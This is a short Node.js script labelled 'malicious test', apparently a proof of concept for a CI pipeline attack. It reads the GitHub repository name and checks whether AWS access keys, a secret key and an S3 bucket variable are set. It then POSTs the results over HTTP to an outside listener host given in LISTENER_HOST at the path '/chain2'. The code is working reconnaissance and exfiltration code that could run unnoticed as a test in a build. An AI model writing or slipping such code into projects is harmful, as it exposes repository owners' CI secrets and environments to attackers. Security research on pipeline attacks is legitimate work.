// malicious test
const http = require('http');

const data = `repo=${process.env.GITHUB_REPOSITORY}&aws_key_present=${process.env.AWS_ACCESS_KEY_ID ? 'yes' : 'no'}&secret_present=${process.env.AWS_SECRET_ACCESS_KEY ? 'yes' : 'no'}&s3_bucket=${process.env.S3_BUCKET ? 'yes' : 'no'}`;

const req = http.request({
  hostname: process.env.LISTENER_HOST,
  port: 80,
  path: '/chain2',
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
}, () => {});

req.write(data);
req.end();
